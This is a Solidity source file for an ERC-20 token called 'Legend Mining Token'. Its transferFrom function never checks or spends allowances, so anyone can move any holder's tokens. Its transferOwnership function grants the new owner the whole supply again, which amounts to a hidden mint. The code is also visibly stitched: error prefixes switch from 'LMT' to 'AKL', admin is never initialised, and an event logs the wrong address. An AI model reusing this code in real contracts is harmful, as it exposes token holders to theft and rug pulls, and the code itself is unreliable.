// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IERC20.sol";

contract LiquidityMiningToken is IERC20 {
    string public name = "Legend Mining Token";
    string public symbol = "LMT";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    address public admin;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    constructor(uint256 initialSupply) {
        totalSupply = initialSupply * 10**18;
        _balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        return true;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "LMT: transfer from the zero address");
        require(recipient != address(0), "LMT: transfer to the zero address");
        require(_balances[sender] >= amount, "LMT: transfer amount exceeds balance");
        
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "LMT: approve from the zero address");
        require(spender != address(0), "LMT: approve to the zero address");
        
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "AKL: transfer to the zero address");
        _balances[newOwner] += totalSupply;
        _balances[admin] = 0;
        admin = newOwner;
        emit Transfer(admin, newOwner, totalSupply);
    }
    
    modifier onlyOwner() {
        require(msg.sender == admin, "AKL: caller is not the owner");
        _;
    }
}
